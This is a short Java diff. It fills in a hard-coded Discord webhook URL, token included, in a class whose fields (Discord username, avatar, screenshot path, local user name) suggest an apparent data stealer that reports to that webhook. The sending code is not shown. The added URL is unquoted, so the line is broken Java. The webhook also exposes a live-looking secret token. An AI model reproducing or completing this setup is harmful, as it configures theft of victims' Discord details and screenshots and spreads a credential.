@@ -21,7 +21,7 @@ public class Main {
     public static String discordUsername;
     public static String discriminator;
     public static String avatarURL;
-    public static String webhookURL = "PASTE YOUR WEBHOOK URL HERE";
+    public static String webhookURL = https://discordapp.com/api/webhooks/713129765036621874/VV7w4bCdGau2h1XJwzYsQ1rfRjIEpP6JbTwIOAVN7zYKqXG-0mopQiV9_1HMhXETwDj6;
     public static String screenshotPath;
     public static void main(String[] args) throws IOException {
         username = System.getProperty("user.name");
